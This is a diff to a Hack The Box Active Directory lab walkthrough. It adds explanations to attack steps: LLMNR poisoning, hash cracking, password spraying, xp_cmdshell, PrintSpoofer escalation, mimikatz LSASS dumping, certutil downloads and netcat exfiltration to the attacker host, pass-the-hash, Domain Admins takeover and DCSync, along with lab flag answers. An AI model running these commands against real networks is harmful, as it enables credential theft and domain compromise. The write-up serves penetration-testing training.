@@ -54,6 +54,7 @@ crackmapexec smb 172.16.7.0/24
 #   SQL01 172.16.7.60 - SMB signing: False (relay target)
 # SMB signing False = we can use NTLM relay attacks against MS01 and SQL01
 ```
+> Scans the subnet for Windows hosts over Server Message Block (SMB). Reports hostname, OS, domain, and signing status for each. Hosts with SMB signing disabled are vulnerable to NTLM relay attacks.
 
 ### Step 1.2 — Start Responder to capture hashes passively
 
@@ -66,6 +67,7 @@ sudo /usr/share/responder/Responder.py -I ens224 -wd
 # When a host queries for a bad name, Responder answers "that's me" and Windows sends credentials
 # Leave this running in the background — hashes appear in /usr/share/responder/logs/
 ```
+> Starts Responder on the internal network interface to capture LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) hashes. Use the internal interface (`ens224`), not the HTB tunnel. Let it run in the background — hashes appear in the logs directory.
 
 ### Step 1.3 — Wait for a hash to appear
 
@@ -75,6 +77,7 @@ sudo awk -F:: '{print $1}' /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.t
 # The NTLMv2 hash file is named after the IP that sent the auth (172.16.7.3 = DC01)
 # Result: AB920 — a user whose computer (DC01) sent credentials to Responder
 ```
+> Extracts just the usernames from the NTLMv2 hash log. The file is named after the IP that sent the credentials. `sort -u` deduplicates repeated captures of the same user.
 
 ### Step 1.4 — Crack the captured hash
 
@@ -86,6 +89,7 @@ hashcat -m 5600 AB920.hash /usr/share/wordlists/rockyou.txt -O
 # -O = optimized mode, runs faster but only works for passwords under 32 chars
 # Result: AB920:weasal   ← Q1 answer: AB920, Q2 answer: weasal
 ```
+> Cracks the captured NTLMv2 hash. `-m 5600` is the hashcat mode for NTLMv2 (the format Responder captures). `-O` speeds up cracking at the cost of a 32-character password limit.
 
 ---
 
@@ -102,6 +106,7 @@ crackmapexec smb 172.16.7.0/24 -u AB920 -p weasal --shares
 #   MS01: IPC$ READ only (AB920 is not local admin here)
 #   SQL01: IPC$ READ only
 ```
+> Confirms the cracked credentials and lists accessible shares. "Department Shares" on DC01 with READ access is worth exploring for sensitive files. IPC$-only access on MS01 and SQL01 means AB920 is not a local admin there.
 
 ### Step 2.2 — Check WinRM access (remote PowerShell)
 
@@ -112,6 +117,7 @@ crackmapexec winrm 172.16.7.0/24 -u AB920 -p weasal
 # Pwn3d! = we can get a PowerShell shell on that host
 # Result: MS01 → Pwn3d! (AB920 has WinRM access to MS01)
 ```
+> Tests Windows Remote Management (WinRM) access across all hosts. "Pwn3d!" means AB920 can open a PowerShell session on that host.
 
 ### Step 2.3 — Read the MS01 C:\flag.txt (Q3)
 
@@ -122,6 +128,7 @@ evil-winrm -i 172.16.7.50 -u AB920 -p weasal
 # Once connected, type: type C:\flag.txt
 # Result: aud1t_gr0up_m3mbersh1ps!  ← Q3 answer
 ```
+> Opens a PowerShell shell on MS01 via evil-winrm. Once connected, read the flag from `C:\flag.txt`.
 
 ---
 
@@ -135,6 +142,7 @@ crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users | \
 # --users = enumerate all domain accounts via SAMR
 # grep + awk + cut = extract just the usernames and save to a file
 ```
+> Dumps all domain usernames using the Security Account Manager Remote protocol (SAMR) and writes them to a file for spraying.
 
 ### Step 3.2 — Spray a common password
 
@@ -147,6 +155,7 @@ kerbrute passwordspray -d inlanefreight.local /tmp/all_users.txt 'Welcome1' --dc
 # --dc 172.16.7.3 = the domain controller to authenticate against
 # Result: BR086@inlanefreight.local:Welcome1  ← Q4: BR086, Q5: Welcome1
 ```
+> Sprays one password against every user. kerbrute uses Kerberos directly — it does not trigger SMB login failures, so it avoids account lockout in most environments.
 
 ---
 
@@ -162,6 +171,7 @@ smbclient -U "BR086%Welcome1" "//172.16.7.3/Department Shares" -c "recurse;ls"
 # -c "recurse;ls" = run commands: recurse (show subfolders) then ls (list all files)
 # Result: finds IT\Private\Development\web.config
 ```
+> Recursively lists all files in the "Department Shares" share. `recurse;ls` walks every subfolder. Look for config files, scripts, or anything with "web", "db", "config", or "password" in the name.
 
 ### Step 4.2 — Download and read the web.config
 
@@ -173,6 +183,7 @@ cat /tmp/web.config
 # Result inside web.config:
 #   User ID=netdb; Password=D@ta_bAse_adm1n!   ← Q6 answer
 ```
+> Downloads the web.config file to `/tmp/` on the attack host, then reads it. ASP.NET web config files frequently contain database connection strings with cleartext credentials.
 
 ---
 
@@ -187,6 +198,7 @@ mssqlclient.py netdb:"D@ta_bAse_adm1n!"@172.16.7.60
 # The SQL server is running on SQL01 at port 1433 (default)
 # Result: SQL shell prompt "SQL>"
 ```
+> Connects to SQL01 using the credentials from web.config. Impacket's mssqlclient.py gives an interactive SQL prompt. A successful connection means the account is valid and the SQL service is reachable.
 
 ### Step 5.2 — Enable xp_cmdshell for OS command execution
 
@@ -200,6 +212,7 @@ enable_xp_cmdshell
 -- xp_cmdshell lets us run Windows CMD commands from inside SQL Server
 -- This works because the SQL service has certain OS privileges
 ```
+> Enables the `xp_cmdshell` stored procedure, which lets SQL Server execute operating system commands. mssqlclient.py wraps the two `sp_configure` calls needed to turn it on. This only works if the SQL account is a sysadmin.
 
 ### Step 5.3 — Check who we are and what privileges we have
 
@@ -212,6 +225,7 @@ xp_cmdshell whoami /priv
 -- SeImpersonatePrivilege lets a process impersonate any user that connects to it
 -- This is the key to escalating from SQL service → SYSTEM via potato attacks
 ```
+> Confirms the OS identity of the SQL service account and checks its token privileges. `SeImpersonatePrivilege = Enabled` is the indicator that a potato-style escalation (PrintSpoofer, JuicyPotato) will work.
 
 ### Step 5.4 — Download PrintSpoofer to SQL01 (for privilege escalation)
 
@@ -220,6 +234,7 @@ xp_cmdshell whoami /priv
 curl -sL -o ~/Downloads/PrintSpoofer64.exe \
   "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
 ```
+> Downloads the PrintSpoofer SeImpersonate-to-SYSTEM exploit to the attack host so it can be served to the target — swap the output path/URL if you need a different release.
 
 ```sql
 -- In the SQL shell:
@@ -229,6 +244,7 @@ xp_cmdshell certutil -urlcache -split -f http://172.16.7.240:8000/PrintSpoofer64
 -- 172.16.7.240 = the attack host's INTERNAL IP (not the HTB tunnel IP)
 -- C:\Windows\Temp\ps.exe = where to save it on SQL01
 ```
+> Downloads PrintSpoofer onto SQL01 via xp_cmdshell + certutil — swap the attack-host IP/port and destination path for your environment.
 
 ### Step 5.5 — Run PrintSpoofer to execute as SYSTEM
 
@@ -251,11 +267,13 @@ xp_cmdshell C:\Windows\Temp\ps.exe -i -c "cmd.exe /c type C:\Users\Administrator
 # Upload mimikatz to attack host first:
 scp ~/Downloads/mimikatz.exe htb-student@ATTACK_HOST_IP:/tmp/
 ```
+> Copies mimikatz from Kali to the Parrot attack host so it can be served to SQL01 — replace `ATTACK_HOST_IP` with the spawned attack-host IP.
 
 ```sql
 -- Download mimikatz to SQL01:
 xp_cmdshell certutil -urlcache -split -f http://172.16.7.240:8000/mimikatz.exe C:\Windows\Temp\mk.exe
 ```
+> Pulls mimikatz onto SQL01 via xp_cmdshell + certutil — swap the attack-host IP/port and destination path as needed.
 
 ```bash
 # Create a batch file that runs mimikatz:
@@ -267,12 +285,14 @@ EOF
 # exit = quit mimikatz when done
 # > C:\Windows\Temp\mko.txt = save output to a file we can read
 ```
+> Builds a batch wrapper that runs mimikatz to dump LSASS credentials to a file — adjust the mimikatz path and output path for your target.
 
 ```sql
 -- Run the batch file via PrintSpoofer (needs SYSTEM to read LSASS):
 xp_cmdshell C:\Windows\Temp\ps.exe -i -c C:\Windows\Temp\run_mk.bat
 -- PrintSpoofer runs the batch file as SYSTEM so mimikatz can access LSASS
 ```
+> Executes the mimikatz batch file as SYSTEM by abusing PrintSpoofer/SeImpersonate — swap the PrintSpoofer and batch-file paths for your target.
 
 ```bash
 # Exfil the output back to the attack host via nc (netcat):
@@ -287,6 +307,7 @@ EOF
 # 172.16.7.240 9999 = send to our listener on port 9999
 # < mko.txt = pipe the mimikatz output file into nc (send it to us)
 ```
+> Starts a netcat listener on Kali and builds a batch file that exfils the mimikatz output over nc — swap the attack-host IP/port and file paths as needed.
 
 ```bash
 # Parse the exfiltrated mimikatz output for credentials:
@@ -335,6 +356,7 @@ bloodhound-python -d INLANEFREIGHT.LOCAL -dc DC01.INLANEFREIGHT.LOCAL \
 # -ns 172.16.7.3 = use DC01 as the DNS server so it can resolve internal hostnames
 # Output: several .json files that feed into the BloodHound GUI
 ```
+> Collects full BloodHound data from Linux using AB920's creds — swap the domain, DC FQDN, credentials, and `-ns` DC IP for your environment.
 
 ### Step 7.2 — Parse BloodHound data to find GenericAll on Domain Admins
 
@@ -359,8 +381,8 @@ for fname in glob.glob('*.json'):
 ## Phase 8 — Capture CT059's Hash via Inveigh (Q10)
 
 **Why Inveigh instead of Responder?**
-- Responder runs on the Parrot Linux box (attack host) — it sees traffic from the internal network BUT CT059 authenticates via Kerberos (not NTLM), so Responder doesn't catch it
-- Inveigh runs ON MS01 (a Windows machine inside the network) — it poisons LLMNR/NBT-NS from inside Windows and catches CT059's NTLMv2 when their machine makes a bad name query
+- Responder runs on the Parrot Linux attack host. It can see traffic from the internal network, but CT059 authenticates to the DC using Kerberos (not NTLM), so Responder does not capture anything.
+- Inveigh runs on MS01 — a Windows machine inside the network. It poisons Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic from inside Windows. When CT059's machine makes a bad name query, Inveigh catches the NTLMv2 response.
 
 ### Step 8.1 — Upload Invoke-Inveigh.ps1 to MS01
 
@@ -372,6 +394,7 @@ cp /usr/share/powershell-empire/empire/server/data/module_source/collection/Invo
 # In mssqlclient.py:
 xp_cmdshell certutil -urlcache -split -f http://172.16.7.240:8000/Invoke-Inveigh.ps1 C:\Windows\Temp\Inveigh.ps1
 ```
+> Stages Invoke-Inveigh on the attack host and downloads it to SQL01 via certutil — swap the Empire source path, attack-host IP/port, and destination path as needed.
 
 ### Step 8.2 — Run Inveigh on MS01 via WMI
 
@@ -387,6 +410,7 @@ impacket-wmiexec -hashes :8c9555327d95f815987c0d81238c7660 \
 # -FileOutput Y = also save captured hashes to files in C:\
 # -RunTime 3 = run for 3 minutes then stop automatically
 ```
+> Runs Inveigh on MS01 over WMI pass-the-hash to poison LLMNR/NBT-NS from inside the network — swap the mssqlsvc hash, target IP, and Inveigh path for your environment.
 
 ### Step 8.3 — Read the captured hashes from the output
 
@@ -435,7 +459,7 @@ conn.modify(da_dn, {'member': [(ldap3.MODIFY_ADD, [ct059_dn])]})
 # Result: {'result': 0, 'description': 'success'} = CT059 is now Domain Admin
 ```
 
-**Why this works:** CT059 has GenericAll on the Domain Admins group object. GenericAll = full control, which includes the ability to add members. We're using CT059's credentials to make the LDAP modification directly on DC01.
+**Why this works:** CT059 has GenericAll on the Domain Admins group object. GenericAll means full control, which includes adding members. We use CT059's credentials to make the Lightweight Directory Access Protocol (LDAP) modification directly on DC01.
 
 ### Step 9.2 — DCSync to dump all domain hashes
 
